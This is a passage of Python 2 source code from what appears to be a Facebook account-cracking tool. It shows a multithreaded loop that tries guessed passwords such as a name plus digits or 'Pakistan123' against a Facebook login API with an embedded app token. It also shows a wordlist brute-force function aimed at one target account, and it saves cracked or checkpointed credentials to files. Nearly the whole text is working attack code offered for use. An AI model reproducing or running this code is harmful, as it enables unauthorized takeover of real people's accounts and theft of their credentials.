											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[\x1b[1;92mHack\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
													cek = open("out/super_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + '1121'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[\x1b[1;92mHack\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
															cek = open("out/super_cp.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = 'Pakistan123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mHack\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																	cek = open("out/super_cp.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id) 
	
	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;96m....'
	print "\033[1;32;40m[+] Total OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
	print """
\033[1;96m⊱⋕⊰══════════════════════════════════════════════⊱⋕⊰
\033[1;91m
▁▁▁▁▁▁▁▁▓♤▓
▁▁▁▁▁▁▁▓♤▓
▁▁▁▁▁▁▓♤▓▁▁▁▁█
▁▁▁▁▓♤▓▓▁▁▁▁███
▁▁▁▓♤▓▁▁▁▁▁██▓██
▁▁▓♤▓▁▁▁▁▁██▓█▓██
▁▓♤▓▁▁▁▁▁█▓▓█▓█▓▓█
▁▓♤▓▁▁▁▁█▓▓█▓▓▓█▓▓█
▁▁▓♤▓▁▁▁█▓▓▓█▓█▓▓▓█
▁▁▁▓♤▓▁▁▁██▓▓█▓▓██
▁▁▁▁▓♤▓▁▁▁██▓▓▓██
▁▁▁▁▁▓♤▓▁▁▁▁███-
▁▁▁▁▁▁▓♤▓▁▁▁▓♤▓-
▁▁▁▁▁▁▁▓♤▓▁▓♤▓-
▁▁▁▁▁▁▁▁▓♤▓♤▓-
▁▁▁▁▁▁▁▁▁▓♤▓-
▁▁▁▁▁▁▁▁▓♤▓
▁▁▁▁▁▁▁▓♤▓
▁▁▁▁▁▁▓♤▓▁▁▁▁█
▁▁▁▁▓♤▓▓▁▁▁▁███
▁▁▁▓♤▓▁▁▁▁▁██▓██
▁▁▓♤▓▁▁▁▁▁██▓█▓██
▁▓♤▓▁▁▁▁▁█▓▓█▓█▓▓█
▁▓♤▓▁▁▁▁█▓▓█▓▓▓█▓▓█
▁▁▓♤▓▁▁▁█▓▓▓█▓█▓▓▓█
▁▁▁▓♤▓▁▁▁██▓▓█▓▓██
▁▁▁▁▓♤▓▁▁▁██▓▓▓██
▁▁▁▁▁▓♤▓▁▁▁▁███-
▁▁▁▁▁▁▓♤▓▁▁▁▓♤▓-
▁▁▁▁▁▁▁▓♤▓▁▓♤▓-
▁▁▁▁▁▁▁▁▓♤▓♤▓-
▁▁▁▁▁▁▁▁▁▓♤▓-

\033[1;93mCHECKPOINT ACCOUNT OPEN AFTER 7 DAYS
\033[1;93mSUBSCRIBES OUR YOUTUBE CHANNEL 
\033[1;93m  THANK FOR USING MY TOOL

\033[1;96m⊱⋕⊰══════════════════════════════════════════════⊱⋕⊰
                """
	
	raw_input("\n\033[1;96m[\033[1;97mExit\033[1;96m]")
	super()

def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\033[1;31;40m ⊱⋕⊰══════════════════════════════════════════════⊱⋕⊰'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[1;31;40m ⊱⋕⊰══════════════════════════════════════════════⊱⋕⊰'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                            print  "\033[1;36;40m ⊱⋕⊰══════════════════════════════════════════════⊱⋕⊰"
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print """\n\x1b[1;91m[!] \x1b[1;92mLooks like you don't have a wordlist"""
            super()

if __name__ == '__main__':
	login() 
